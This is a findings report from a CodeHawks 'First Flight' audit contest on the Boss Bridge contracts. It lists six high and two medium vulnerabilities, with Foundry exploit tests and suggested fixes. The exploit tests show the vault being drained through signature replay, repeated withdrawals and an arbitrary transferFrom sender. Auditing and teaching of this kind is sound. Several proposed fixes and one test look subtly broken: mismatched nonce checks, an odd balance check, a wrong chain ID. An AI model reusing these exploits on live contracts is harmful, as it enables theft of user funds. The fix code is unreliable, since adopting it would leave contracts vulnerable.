# First Flight #4: Boss Bridge - Findings Report

# Table of contents
- ## [Contest Summary](#contest-summary)
- ## [Results Summary](#results-summary)
- ## High Risk Findings
    - ### [H-01. Signer can withdraw multiple times, potentially emptying the vault.](#H-01)
    - ### [H-02. Potential Front-Running attack, Attacker could withdraw tokens from L2 before the user](#H-02)
    - ### [H-03. Fixed Initial Supply Vulnerability, potentially affecting token functionality and intended use cases](#H-03)
    - ### [H-04. Lack of Compiler Awareness for 'contractBytecode', Potential for Incorrect Contract Deployment and Address Calculation in zkSync](#H-04)
    - ### [H-05. Signature Replay Attack in Withdrawal, Leads to Unauthorized Spending or Unintended Consequences.](#H-05)
    - ### [H-06. Arbitrary 'from' in 'transferFrom' – Unauthorized Access](#H-06)
- ## Medium Risk Findings
    - ### [M-01. Signature Replay Across Chains, Possible Unauthorized Execution on Different Chains](#M-01)
    - ### [M-02. No validation of contractBytecode, Wasted Gas and Resources](#M-02)



# <a id='contest-summary'></a>Contest Summary

### Sponsor: First Flight #4

### Dates: Nov 9th, 2023 - Nov 15th, 2023

[See more contest details here](https://www.codehawks.com/contests/clomptuvr0001ie09bzfp4nqw)

# <a id='results-summary'></a>Results Summary

### Number of findings:
   - High: 6
   - Medium: 2
   - Low: 0


# High Risk Findings

## <a id='H-01'></a>H-01. Signer can withdraw multiple times, potentially emptying the vault.            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-11-Boss-Bridge/blob/dad104a9f481aace15a550cf3113e81ad6bdf061/src/L1BossBridge.sol#L57

https://github.com/Cyfrin/2023-11-Boss-Bridge/blob/dad104a9f481aace15a550cf3113e81ad6bdf061/src/L1BossBridge.sol#L115

## Summary

Owner's permission for a user to become a signer allows them to execute the withdrawal function multiple times, posing a risk of emptying the vault, with no safeguards to prevent multiple withdrawals.

## Vulnerability Details

Lack of safeguards in `L1BossBridge.sol::withdrawTokensToL1` enables signed users to repeatedly execute the withdrawal function, potentially emptying the vault.

## Impact

The impact is that a signed user can potentially deplete the vault by repeatedly executing the withdrawal function.

## POC

- considering attacker and user have `10e18` deposit amount each and they deposit it
- copy paste the below test case
- run `forge test --match-test testAttackerCanWithdrawMultipleTimes -vvvv`

Results:

```
Running 1 test for test/L1TokenBridge.t.sol:L1BossBridgeTest
[PASS] testAttackerCanWithdrawMultipleTimes() (gas: 142096)
Logs:
  Vault Balance After Attacker and User deposits:  20000000000000000000
  Vault Balance After Attacker withdrawal of his funds:  10000000000000000000
  Vault Balance after attacker withdraw USER funds from vault:  0
  User Balance at END 0
  Attacker Balance at END 20000000000000000000
```

Test:
```
function testAttackerCanWithdrawMultipleTimes() public {
    vm.startPrank(attacker);
    uint256 depositAmount = 10e18;
    token.approve(address(tokenBridge), depositAmount);
    tokenBridge.depositTokensToL2(attacker, userInL2, depositAmount);

    vm.startPrank(user);
    token.approve(address(tokenBridge), depositAmount);
    tokenBridge.depositTokensToL2(user, userInL2, depositAmount);
    console.log("Vault Balance After Attacker and User deposits: ", token.balanceOf(address(vault)));

    (uint8 v, bytes32 r, bytes32 s) = _signMessage(_getTokenWithdrawalMessage(attacker, depositAmount), operator.key);
    tokenBridge.withdrawTokensToL1(attacker, 10e18, v, r, s);
    console.log("Vault Balance After Attacker withdrawal of his funds: ", token.balanceOf(address(vault)));

    tokenBridge.withdrawTokensToL1(attacker, 10e18, v, r, s); // in here attacker has withdrawn more ETH from Vault

    console.log("Vault Balance after attacker withdraw USER funds from vault: ", token.balanceOf(address(vault)));
    console.log("User Balance at END", token.balanceOf(address(user)));
    console.log("Attacker Balance at END", token.balanceOf(address(attacker)));

    assertEq(token.balanceOf(address(vault)), 0);
}
```

## Tools Used

- Manual review and foundry

## Recommendations

**Fix:** Implement a mechanism that tracks the amount already withdrawn by a signed user and limits subsequent withdrawals to the remaining balance in the vault for that user.

```
+mapping(address => uint256) public withdrawnBalances; // Track withdrawn amounts for each signer
```

In withdraw function add these lines

```
function withdrawTokensToL1(address to, uint256 amount, uint8 v, bytes32 r, bytes32 s) external {
+    require(signers[msg.sender], "Signer only");
+    uint256 availableBalance = vault.balanceOf(msg.sender) - withdrawnBalances[msg.sender];
+    require(amount <= availableBalance, "Exceeds available balance");
    
+    withdrawnBalances[msg.sender] += amount;
```

In this modified contract, the `withdrawTokensToL1` function checks the available balance for the signed user and ensures that withdrawals do not exceed it. The `withdrawnBalances` mapping tracks the cumulative withdrawn amounts for each signer.









## <a id='H-02'></a>H-02. Potential Front-Running attack, Attacker could withdraw tokens from L2 before the user            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-11-Boss-Bridge/blob/dad104a9f481aace15a550cf3113e81ad6bdf061/src/L1BossBridge.sol#L91

## Summary

A signed transaction can be exploited by an attacker to front-run the withdrawal of tokens from `L2` to `L1`, allowing the attacker to gain control of the tokens before the intended recipient. This vulnerability could potentially result in unauthorized token transfers if not properly mitigated.

## Vulnerability Details

The vulnerability allows an attacker to front-run token withdrawals from L2 to L1, potentially gaining control of tokens intended for another recipient.

## Impact

The impact is that an attacker can manipulate token withdrawals, potentially stealing tokens intended for a legitimate recipient.

## Tools Used

- Manual review

## Recommendations

Mitigating the issue primarily involves addressing replay attacks. To prevent replay attacks in the provided code, you can introduce a nonce and use **Ethereum's EIP-712** standard for signing messages. Here's what you should do:

```solidity
// Define a mapping to store nonces for each signer
mapping(address => uint256) public nonces;

function withdrawTokensToL1(address to, uint256 amount, uint8 v, bytes32 r, bytes32 s) external {
    // Create a unique nonce for this transaction
    uint256 nonce = nonces[msg.sender]++;
    
    // Construct the message to be signed using EIP-712 format
    bytes32 messageHash = keccak256(
        abi.encodePacked(
            "\x19\x01",
            getDomainSeparator(),
            keccak256(abi.encodePacked(
                address(this),
                to,
                amount,
                nonce
            ))
        )
    );

    address signer = ECDSA.recover(messageHash, v, r, s);

    // Check if the recovered signer is valid
    require(signers[signer], "Invalid signer");

    // Ensure the nonce is valid and not already used
    require(nonce == nonces[signer], "Invalid nonce");

    // Proceed with the token withdrawal logic
    token.transferFrom(vault, to, amount);
}

// Define the EIP-712 domain separator
function getDomainSeparator() public view returns (bytes32) {
    return keccak256(
        abi.encode(
            keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"),
            keccak256(bytes("YourContractName")), // Replace with your contract name
            keccak256(bytes("1")),                // Replace with your contract version
            chainId(),
            address(this)
        )
    );
}

// Define a function to get the current chain ID
function chainId() internal pure returns (uint256) {
    uint256 id;
    assembly {
        id := chainid()
    }
    return id;
}
```
## <a id='H-03'></a>H-03. Fixed Initial Supply Vulnerability, potentially affecting token functionality and intended use cases            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-11-Boss-Bridge/blob/dad104a9f481aace15a550cf3113e81ad6bdf061/src/L1Token.sol#L7

## Summary

The requirement allows for different tokens with varying initial supplies, but the fixed initial supply vulnerability in `L1Token.sol` deploys tokens with a constant `INITIAL_SUPPLY` of 1,000,000, regardless of specified values in for new token. The fixed initial supply vulnerability may lead to discrepancies between the specified initial supply in the contract bytecode and the actual minted supply, potentially affecting token functionality and intended use cases

## Vulnerability Details

The fixed initial supply vulnerability results in token contracts being deployed with a constant `INITIAL_SUPPLY`, potentially deviating from the specified initial supply in contract bytecode

## Impact

The fixed initial supply vulnerability includes discrepancies between specified and actual token supplies, potentially affecting asset tokenization, governance, and other use cases requiring precise supply control

## Tools Used

- Foundry and manual review

## Recommendations

Add dynamic configuration for `INITIAL_SUPPLY`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import { ERC20 } from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract L1Token is ERC20 {
    uint256 private _initialSupply;

    constructor(string memory name, string memory symbol, uint256 initialSupply) ERC20(name, symbol) {
        require(initialSupply > 0, "Initial supply must be greater than 0");
        _initialSupply = initialSupply;
        _mint(msg.sender, initialSupply * 10 ** uint256(decimals()));
    }

    function getInitialSupply() public view returns (uint256) {
        return _initialSupply;
    }
}
```

In this modified contract:

- The INITIAL_SUPPLY constant is removed, and a private `_initialSupply` variable is introduced to store the initial supply.
- The `constructor` now accepts parameters for the token name, symbol, and initial supply.
- The require statement ensures that the initial supply is greater than 0.
- The `_initialSupply` value is used to mint the initial tokens in the constructor.
- A `getInitialSupply` function is included to retrieve the initial supply if needed.
- This modification allows for dynamic supply configuration when deploying the `L1Token` contract, and the initial supply can be specified during contract deployment.





## <a id='H-04'></a>H-04. Lack of Compiler Awareness for 'contractBytecode', Potential for Incorrect Contract Deployment and Address Calculation in zkSync            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-11-Boss-Bridge/blob/dad104a9f481aace15a550cf3113e81ad6bdf061/src/TokenFactory.sol#L23

## Summary

As the contract will be deployed on both L1 and L2 (**zkSync**), the issue lies in the lack of compiler awareness for `contractBytecode` in zkSync, potentially resulting in incorrect contract deployments and address calculation.

## Vulnerability Details

The lack of compiler awareness regarding the runtime `contractBytecode` may lead to incorrect contract deployments and address calculation in zkSync, potentially causing operational issues.

## Impact

This vulnerability can result in unreliable and potentially non-compliant contract deployments in zkSync, compromising the stability and integrity of the system.

## Proof of Concept:

To demonstrate the impact of the lack of compiler awareness in zkSync contract deployment, consider a scenario where a contract is deployed using the `create` function with runtime bytecode provided as a parameter, such as in the `myFactory` function. This could result in a contract deployment that does not adhere to zkSync's bytecode format requirements and may lead to operational issues, highlighting the necessity of following zkSync's guidelines for bytecode and compiler awareness.

ref @ https://era.zksync.io/docs/reference/architecture/differences-with-ethereum.html#evm-instructions

## Tools Used

- manual review and foundry

## Recommendations

To address the lack of compiler awareness and ensure correct contract deployment in the zkSync environment, the following recommendations are suggested:

- **Compile-Time Bytecode:** Modify the contract deployment process to ensure that the bytecode is known at compile time. Use `type(T).creationCode` to determine the bytecode in advance, aligning with zkSync's specific requirements.

- **Bytecode Validation:** Implement bytecode validation to ensure that the `contractBytecode` parameter adheres to zkSync's bytecode format requirements. Validate the bytecode's length, word count, and other format criteria before deployment to prevent issues.

Replace deploy function with this

```javascript
function deployToken(string memory symbol, bytes memory contractBytecode) public onlyOwner returns (address addr) {
    address deployedContract;

    // Check if the deployment is on L1 or L2 (zkSync)
    if (block.chainid == 1) {
        // On L1 (Ethereum mainnet), use the provided bytecode
        assembly {
            addr := create(0, add(contractBytecode, 0x20), mload(contractBytecode))
        }
        require(addr != address(0), "Deployment failed on L1.");
        deployedContract = addr;
    } else if (block.chainid == 77) {
        // On L2 (zkSync), use the bytecode of MyContract (replace with your contract's name)
        bytes memory bytecode = type(MyContract).creationCode;

        // Ensure the bytecode adheres to zkSync's format requirements
        require(bytecode.length % 32 == 0, "Bytecode length must be divisible by 32.");
        require(bytecode.length / 32 % 2 == 1, "Word count must be odd.");
        require(bytecode.length <= 2 ** 21, "Bytecode exceeds maximum length.");

        // Deploy the contract with create2 and calculated salt
        assembly {
            addr := create2(0, add(bytecode, 32), mload(bytecode), salt)
        }
        require(addr != address(0), "Deployment failed on L2.");
        deployedContract = addr;
    } else {
        revert("Invalid chainid. Deployment is supported on L1 (Ethereum) and L2 (zkSync) only.");
    }

    // Store the symbol-address mapping
    s_tokenToAddress[symbol] = deployedContract;

    // Emit an event to signal successful deployment
    emit TokenDeployed(symbol, deployedContract);
}
```
## <a id='H-05'></a>H-05. Signature Replay Attack in Withdrawal, Leads to Unauthorized Spending or Unintended Consequences.            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-11-Boss-Bridge/blob/dad104a9f481aace15a550cf3113e81ad6bdf061/src/L1BossBridge.sol#L91

## Summary

In `L1BossBridge::withdrawTokensToL1` the signature Replay attacks on withdrawls can lead to unauthorized spending or unintended consequences.

## Vulnerability Details

The vulnerability arises from inadequate protection against signature replay attacks in the `withdrawTokensToL1` function.

## Impact

In `L1BossBridge::withdrawTokensToL1`, signature replay attacks on withdrawals can result in unauthorized spending or unintended consequences.

## POC

- Deposit a certain amount of tokens into the bridge contract.
- Get approval from the **contract owner** to be included in the signers mapping. This approval step is necessary to identify legitimate signers.
- Now run the test and you will get this result `Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 18.86ms`

```
// replay attack
// considering attacker is in signers mapping and has deposited tokens already
function testReplayAttack() public {
     vm.startPrank(user);
     uint256 depositAmount = 10e18;
     uint256 userInitialBalance = token.balanceOf(address(user));
    
     token.approve(address(tokenBridge), depositAmount);
     tokenBridge.depositTokensToL2(user, userInL2, depositAmount);
    
     assertEq(token.balanceOf(address(vault)), depositAmount);
     assertEq(token.balanceOf(address(user)), userInitialBalance - depositAmount);
    
     uint256 attackerBeforeAmount = token.balanceOf(address(attacker));
     console.log("Attacker Amount Before Withdrawal:", attackerBeforeAmount);
    
     (uint8 v, bytes32 r, bytes32 s) = _signMessage(_getTokenWithdrawalMessage(user, depositAmount), operator.key);
    
     vm.startPrank(attacker);
     tokenBridge.sendToL1(v, r, s, _getTokenWithdrawalMessage(attacker, depositAmount));
    
     uint256 attackerAfterAmount = token.balanceOf(address(attacker));
    
     assertTrue(attackerAfterAmount > attackerBeforeAmount, "Replay attack was successful");
     console.log("Attacker Amount After Withdrawal:", attackerAfterAmount);
     assertEq(token.balanceOf(address(vault)), 0);
     vm.stopPrank();
}
```

## Tools Used

- Foundry and manual review

## Recommendations

To prevent replay attacks in the provided code, you can introduce a nonce and use **Ethereum's EIP-712** standard for signing messages. Here's what you should do:

```solidity
// Define a mapping to store nonces for each signer
mapping(address => uint256) public nonces;

function withdrawTokensToL1(address to, uint256 amount, uint8 v, bytes32 r, bytes32 s) external {
    // Create a unique nonce for this transaction
    uint256 nonce = nonces[msg.sender]++;
    
    // Construct the message to be signed using EIP-712 format
    bytes32 messageHash = keccak256(
        abi.encodePacked(
            "\x19\x01",
            getDomainSeparator(),
            keccak256(abi.encodePacked(
                address(this),
                to,
                amount,
                nonce
            ))
        )
    );

    address signer = ECDSA.recover(messageHash, v, r, s);

    // Check if the recovered signer is valid
    require(signers[signer], "Invalid signer");

    // Ensure the nonce is valid and not already used
    require(nonce == nonces[signer], "Invalid nonce");

    // Proceed with the token withdrawal logic
    token.transferFrom(vault, to, amount);
}

// Define the EIP-712 domain separator
function getDomainSeparator() public view returns (bytes32) {
    return keccak256(
        abi.encode(
            keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"),
            keccak256(bytes("YourContractName")), // Replace with your contract name
            keccak256(bytes("1")),                // Replace with your contract version
            chainId(),
            address(this)
        )
    );
}

// Define a function to get the current chain ID
function chainId() internal pure returns (uint256) {
    uint256 id;
    assembly {
        id := chainid()
    }
    return id;
}
```
## <a id='H-06'></a>H-06. Arbitrary 'from' in 'transferFrom' – Unauthorized Access            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-11-Boss-Bridge/blob/dad104a9f481aace15a550cf3113e81ad6bdf061/src/L1BossBridge.sol#L74

## Summary

In `depositTokensToL2` function's use of "transferFrom" with an arbitrary "from" address, potentially granting unauthorized access. It allows an attacker, to exploit user's approval for the contract to spend his tokens. Attacker can call the function and specify user's address as the "from" parameter in "transferFrom", enabling him to transfer user's tokens.

## Vulnerability Details

In the smart contract, an attacker can manipulate the "from" address in the `depositTokensToL2` function, leading to unauthorized access and the potential transfer of another user's tokens, undermining the security and integrity of the contract's token handling.

## Impact

The vulnerability exposes a critical risk of unauthorized token transfers, potentially leading to loss of user funds and a breach of trust in the affected smart contract.

## POC

- Copy the below test function and paste it in `L1BossBridgeTest.t.sol`
- now run `forge test --match-test testManipulatedFromAddressCanDeposit -vvvv` in terminal
- you will get this result `Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 16.16ms`

```
function testManipulatedFromAddressCanDeposit() public {
    address attacker = makeAddr("attacker");

    vm.startPrank(user);
    uint256 amount = 10e18;
    token.approve(address(tokenBridge), amount);
    vm.stopPrank();
    vm.expectEmit(address(tokenBridge));

    // Attacker is calling the deposit and using user addy as from
    vm.startPrank(attacker);
    emit Deposit(user, userInL2, amount);
    tokenBridge.depositTokensToL2(user, userInL2, amount);

    assertEq(token.balanceOf(address(tokenBridge)), 0);
    assertEq(token.balanceOf(address(vault)), amount);
    vm.stopPrank();
}
```

## Tools Used

- Foundry and manual review

## Recommendations

Use `msg.sender` as `from` in transferFrom.

replace **depositTokensToL2** function with below code:

```diff
+function depositTokensToL2(address l2Recipient, uint256 amount) external whenNotPaused {
+    if (token.balanceOf(address(vault)) + amount > DEPOSIT_LIMIT) {
+        revert L1BossBridge__DepositLimitReached();
+    }
    
+    // Use msg.sender as the sender address
+    token.safeTransferFrom(msg.sender, address(vault), amount);

+    // Our off-chain service picks up this event and mints the corresponding tokens on L2
+    emit Deposit(msg.sender, l2Recipient, amount);
}
```
		
# Medium Risk Findings

## <a id='M-01'></a>M-01. Signature Replay Across Chains, Possible Unauthorized Execution on Different Chains            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-11-Boss-Bridge/blob/dad104a9f481aace15a550cf3113e81ad6bdf061/src/L1BossBridge.sol#L91

## Summary

The protocol will be deployed on both **Ethereum** and **ZKSync**. The identified issue pertains to the possibility of unauthorized transactions occurring across different chains due to signature replay. To mitigate this concern, it is essential to incorporate the respective chain's ID into the signed data, in order to prevent signature reuse on distinct chains.

## Vulnerability Details

Potential unauthorized transactions via signature replay across different chains.

## Impact

Unauthorized execution of transactions on different chains due to signature replay, potentially leading to financial losses or misbehavior

## Tools Used

- Manual review 

## Recommendations

Ensure that the signed data includes the `chain ID` where it should be executed to prevent signature reuse on different chains.
## <a id='M-02'></a>M-02. No validation of contractBytecode, Wasted Gas and Resources            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-11-Boss-Bridge/blob/dad104a9f481aace15a550cf3113e81ad6bdf061/src/TokenFactory.sol#L23

## Summary

Deployment of contracts with incorrect `contractBytecode` in the `deployToken` function can result in failed deployments, wasted resources, address calculation issues, operational disruption, security risks, and potential data loss. To mitigate these risks, bytecode validation and proper error handling should be implemented

## Vulnerability Details

Lack of bytecode validation in `deployToken` can lead to insecure contract deployments with incorrect bytecode.

## Impact

No validation of `contractBytecode` can lead to failed deployments, wasted resources, address calculation issues, operational disruption, security risks, and potential data loss

## POC

- copy and paste the below test in `TokenFactoryTest` 
- run `forge test --match-path test/TokenFactoryTest.t.sol -vvvv`
- Even that the byteCode is incorrect, you will get `Test result: ok. 2 passed; 0 failed; 0 skipped; finished in 1.32ms`

```solidity
function testIncorrectDeployment() public {
    vm.prank(owner);
    // Simulate an incorrect deployment by using the provided incorrectBytecode
    bytes memory incorrectBytecode = hex"0080fd5b5060df8061001f60";
    address tokenAddress = tokenFactory.deployToken("MyToken", incorrectBytecode);
    // Assertion
    assertEq(tokenAddress, tokenFactory.getTokenAddressFromSymbol("MyToken"));
}
```
## Tools Used

- Foundry and Manual review

## Recommendations

Add bytecode validation function in deployToken function, so that it checks if the bytecode length is divisible by 32 and has an odd word count (word count in 32-byte chunks)

```diff
+require(isValidBytecode(contractBytecode), "Invalid bytecode format");
```

Function code:

```
function isValidBytecode(bytes memory bytecode) internal pure returns (bool) {
    // Check if bytecode length is divisible by 32
    if (bytecode.length % 32 != 0) {
        return false;
    }

    // Check if the word count (32-byte chunks) is odd
    uint256 wordCount = bytecode.length / 32;
    if (wordCount % 2 == 0) {
        return false;
    }

    // If both conditions are met, the bytecode is considered valid
    return true;
}
```




